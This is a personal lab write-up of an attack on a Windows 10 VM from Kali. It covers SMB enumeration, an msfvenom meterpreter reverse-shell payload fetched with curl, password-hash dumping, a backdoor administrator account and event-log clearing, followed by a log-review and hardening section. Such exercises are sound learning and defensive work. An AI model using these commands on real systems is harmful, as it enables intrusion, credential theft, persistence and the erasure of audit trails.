# Windows 10 Pro Attack Lab — Enumeration & Exploitation Setup

**Objective:**  
Use Kali Linux to perform enumeration and prepare for exploitation against a Windows 10 Pro virtual machine.


## Lab Details

- **Target:** Windows 10 Pro VM
- **Attacker:** Kali Linux
- **Network Mode:** Host-only Adapter
- **Windows Firewall:** Disabled
- **AV/Defender:** Disabled


## Step 1: Confirm Connectivity

### From Kali:

```bash
ping 192.168.56.101
```
### Error

```bash
┌──(kali㉿kali)-[~]
└─$ ping 192.168.56.101
PING 192.168.56.101 (192.168.56.101) 56(84) bytes of data.
 ^C
--- 192.168.56.101 ping statistics ---
41 packets transmitted, 0 received, 100% packet loss, time 40962ms
```
I was able to ping Kali from Windows so I figured the firewall on Windows 10 was still active

### Turn off Windows 10 Pro firewall
```bash
netsh advfirewall set allprofiles state off
```

### Retry Ping
```bash
┌──(kali㉿kali)-[~]
└─$ ping 192.168.56.101
PING 192.168.56.101 (192.168.56.101) 56(84) bytes of data.
64 bytes from 192.168.56.101: icmp_seq=1 ttl=128 time=1.55 ms
64 bytes from 192.168.56.101: icmp_seq=2 ttl=128 time=1.16 ms
64 bytes from 192.168.56.101: icmp_seq=3 ttl=128 time=1.61 ms
^C
--- 192.168.56.101 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2004ms
rtt min/avg/max/mdev = 1.159/1.440/1.609/0.200 ms
```


## Step 2: Nmap Scan

### Nmap scan
```bash
nmap -sS -sV -O 192.168.56.101
-sS: SYN scan

-sV: Service version detection

-O: OS detection
```
Performed a full TCP port scan to identify open ports, running services, and OS details. This helped build a footprint of the target system.

### Results
```bash
┌──(kali㉿kali)-[~]
└─$ nmap -sS -sV -O 192.168.56.101 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-02 15:38 EDT
Stats: 0:00:12 elapsed; 0 hosts completed (0 up), 1 undergoing ARP Ping Scan
Parallel DNS resolution of 1 host. Timing: About 0.00% done
Stats: 0:00:20 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 0.00% done
Nmap scan report for 192.168.56.101
Host is up (0.0014s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE       VERSION
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?
MAC Address: 08:00:27:CA:D0:E5 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Microsoft Windows 10
OS CPE: cpe:/o:microsoft:windows_10
OS details: Microsoft Windows 10 1709 - 1909
Network Distance: 1 hop
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.01 seconds
```

## Step 3: Enable Optional Services on Windows 10

### On the Windows VM:

Open: Windows Search → Features → Turn Windows features on or off

Enable:

SMB 1.0/CIFS File Sharing Support

Telnet Client

IIS

Enabled legacy and network-accessible services on the Windows VM to expand the attack surface and allow enumeration and post-exploitation tools to function.

## Step 4: SMB Enumeration from Kali
Use tools in Linux to enumerate SMB shares, check for anonymous access, and fingerprint the SMB configuration. This helps identify misconfigurations and potential vectors for exploitation.

```bash
enum4linux 192.168.56.101
```

### Result:
```bash
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Wed Jul  2 15:49:59 2025

 =========================================( Target Information )=========================================
                                                                                                                   
Target ........... 192.168.56.101                                                                                  
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ===========================( Enumerating Workgroup/Domain on 192.168.56.101 )===========================
                                                                                                                   
                                                                                                                   
[+] Got domain/workgroup name: WORKGROUP                                                                           
                                                                                                                   
                                                                                                                   
 ===============================( Nbtstat Information for 192.168.56.101 )===============================
                                                                                                                   
Looking up status of 192.168.56.101                                                                                
        DESKTOP-F3BUVNO <00> -         B <ACTIVE>  Workstation Service
        WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
        DESKTOP-F3BUVNO <20> -         B <ACTIVE>  File Server Service
        WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections
        WORKGROUP       <1d> -         B <ACTIVE>  Master Browser
        ..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser

        MAC Address = 08-00-27-CA-D0-E5

 ==================================( Session Check on 192.168.56.101 )==================================
                                                                                                                   
                                                                                                                   
[E] Server doesn't allow session using username '', password ''.  Aborting remainder of tests.
```
Used enum4linux to attempt anonymous SMB enumeration. Even when access is denied, it helps confirm that SMBv1 and NetBIOS are active.

```bash
smbclient -L //192.168.56.101 -N
```
### Result:
```bash
└─$ smbclient -L //192.168.56.101 -N
session setup failed: NT_STATUS_ACCESS_DENIED
```
Try to list available SMB shares anonymously. If rejected, it confirms the system restricts access, but still responds which indicates SMB is active

```bash
crackmapexec smb 192.168.56.101
```

Result:
```bash
└─$ crackmapexec smb 192.168.56.101
/usr/lib/python3/dist-packages/cme/cli.py:37: SyntaxWarning: invalid escape sequence '\ '
  formatter_class=RawTextHelpFormatter)
[*] First time use detected
[*] Creating home directory structure
[*] Creating default workspace
[*] Initializing SSH protocol database
[*] Initializing MSSQL protocol database
[*] Initializing SMB protocol database
[*] Initializing WINRM protocol database
[*] Initializing LDAP protocol database
[*] Initializing FTP protocol database
[*] Initializing RDP protocol database
[*] Copying default configuration file
[*] Generating SSL certificate
/usr/lib/python3/dist-packages/cme/protocols/smb/smbexec.py:49: SyntaxWarning: invalid escape sequence '\p'
  stringbinding = 'ncacn_np:%s[\pipe\svcctl]' % self.__host
/usr/lib/python3/dist-packages/cme/protocols/smb/smbexec.py:93: SyntaxWarning: invalid escape sequence '\{'
  command = self.__shell + 'echo '+ data + ' ^> \\\\127.0.0.1\\{}\\{} 2^>^&1 > %TEMP%\{} & %COMSPEC% /Q /c %TEMP%\{} & %COMSPEC% /Q /c del %TEMP%\{}'.format(self.__share_name, self.__output, self.__batchFile, self.__batchFile, self.__batchFile)
/usr/lib/python3/dist-packages/cme/protocols/winrm.py:324: SyntaxWarning: invalid escape sequence '\S'
  self.conn.execute_cmd("reg save HKLM\SAM C:\\windows\\temp\\SAM && reg save HKLM\SYSTEM C:\\windows\\temp\\SYSTEM")
/usr/lib/python3/dist-packages/cme/protocols/winrm.py:338: SyntaxWarning: invalid escape sequence '\S'
  self.conn.execute_cmd("reg save HKLM\SECURITY C:\\windows\\temp\\SECURITY && reg save HKLM\SYSTEM C:\\windows\\temp\\SYSTEM")
SMB         192.168.56.101  445    DESKTOP-F3BUVNO  [*] Windows 10 Pro 19045 x64 (name:DESKTOP-F3BUVNO) (domain:DESKTOP-F3BUVNO) (signing:False) (SMBv1:True)
```
Use CrackMapExec to quickly fingerprint the SMB configuration. Tells whether SMB signing is enforced and whether legacy protocols like SMBv1 are enabled.

## Step 5: Exploit (Simulate Access to Windows 10 Machine via Reverse Shell Payload)
Although Step 4 focused on SMB-based attack vectors, the Windows 10 machine was found to be patched against remote SMB exploits. To simulate a more realistic attack scenario, I'm simulating gaining access through phising or malware. 

### Generate a reverse shell payload on Kali:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<Kali-IP> LPORT=4444 -f exe -o payload.exe
```

### Host the paylaod using a Python HTTP Server
```bash
python3 -m http.server 80
```

### Download the payload (On Windows VM)
```bash
curl http://192.168.56.103/payload.exe -o payload.exe
```

### Start a Metasploit handler on Kali
```bash
msfconsole

use/exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <192.168.56.103>
set LPORT 4444
run
```

### In Windows Command Prompt (Run in the correct directory):
```bash
payload.exe
```

### Kali Meterpreter Session Running:
```bash
[*] Using configured payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
PAYLOAD => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 192.168.56.103
LHOST => 192.168.56.103
msf6 exploit(multi/handler) > set LPORT 4444
LPORT => 4444
msf6 exploit(multi/handler) > run


[*] Started reverse TCP handler on 192.168.56.103:4444 
[*] Sending stage (203846 bytes) to 192.168.56.101
[*] Meterpreter session 1 opened (192.168.56.103:4444 -> 192.168.56.101:49688) at 2025-07-02 18:19:58 -0400
```

## Step 6: Post-Exploitation & Privilege Escalation
```bash
shell
whoami
net localgroup administrators
```

### In Kali:
```bash
C:\Windows\System32>whoami
whoami
desktop-f3buvno\user

C:\Windows\System32>net localgroup administrators
net localgroup administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
user
The command completed successfully.
```

## Step 7: Dump Password Hashes and Add Backdoor
```bash
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
user:1002:aad3b435b51404eeaad3b435b51404ee:57d583aa46d571502aad4bb7aea09c70:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:04dbcbc8a23c9a31479a3ad8a3a8f2e7:::
```

### Add Backdoor:
```bash
C:\Windows\System32>net user backdoor P@ssword123 /add
net localgroup administrators backdoor /add
net user backdoor P@ssword123 /add
The command completed successfully.


C:\Windows\System32>net localgroup administrators backdoor /add
The command completed successfully.
```

## Step 8: Check for Evidence of Intrusion in Windows Logs

Attempted to identify evidence of attacker activity (such as payload execution, backdoor creation, or command usage) using default Windows event logs.


Investigation Steps Taken:

Opened Event Viewer
  - Navigated to:
    - Windows Logs → Security
    - Windows Logs → System
    - Windows Logs → Application

Manually reviewed key Event IDs:
- **Event ID 4720**: Logged creation of the `backdoor` user
- **Event ID 4722**: Showed the `backdoor` account being enabled
- **Event ID 4732**: Confirmed `backdoor` was added to the Administrators group
- **Event ID 4672**: Showed assignment of special privileges to `backdoor`
- **Event ID 4624**: Reflected interactive logon activity

Used the Find feature to search for keywords:
- payload.exe
- System32
- net user
- P@ssword123
- cmd.exe

### Interpretation:

Windows default logging **successfully captured** key account-based post-exploitation actions:

- Backdoor creation
- Privilege escalation
- Logon activity

This demonstrates that even without enhanced logging, user and group changes leave a clear trail. However, command execution visibility was limited, highlighting the need for:

- Command-line auditing
- Advanced tools like **Sysmon** for deeper detection

## Step 9: Covering Tracks/Clearing Logs

Basic anti-forensics:
```cmd
wevtutil cl Security
wevtutil cl System
wevtutil cl Application
```

### Verification:
```cmd
wevtutil qe Security /c:1 /f:text
```
Output:
```bash
C:\Windows\System32>wevtutil cl Security 
wevtutil cl Security                                                                                    
C:\Windows\System32>wevtutil cl System                                                                              
wevtutil cl System                                                                                                             
C:\Windows\System32>wevtutil cl Application                                                                         
wevtutil cl Application                                                                                                        
C:\Windows\System32>wevtutil qe Security /c:1 /f:text                                                               
wevtutil qe Security /c:1 /f:text                                                                                   
Event[0]:                                                                                                           
  Log Name: Security                                                                                      
  Source: Microsoft-Windows-Eventlog                                                                                
  Date: 2025-07-02T20:08:52.1830000Z                                                                                
  Event ID: 1102                                                                                                    
  Task: Log clear                                                                                                   
  Level: Information                                                                                                
  Opcode: Info                                                                                                      
  Keyword: Audit Success                                                                                            
  User: N/A                                                                                                         
  User Name: N/A                                                                                                    
  Computer: DESKTOP-F3BUVNO                                                                                         
  Description:                                                                                                      
The audit log was cleared.                                                                                          
Subject:                                                                                                            
        Security ID:    S-1-5-21-3002359383-4211767976-1640186519-1002                                              
        Account Name:   user                                                                                        
        Domain Name:    DESKTOP-F3
```

## Summary & Key Takeaways

- Enumeration revealed active SMB services and OS version
- Payload delivery simulated phishing with reverse shell
- Privilege escalation was unnecessary because initial user had admin rights
- Persistence achieved via backdoor account
- Log analysis caught account changes but lacked command visibility
- Log clearing effectively removed event traces from default logs

### Recommendations:
- Enable command-line auditing
- Deploy tools like Sysmon to detect payload execution
- Restrict legacy services (e.g., SMBv1) and enforce strong audit policies

This lab demonstrated a realistic attacker workflow and the value of both proactive hardening and detailed monitoring.

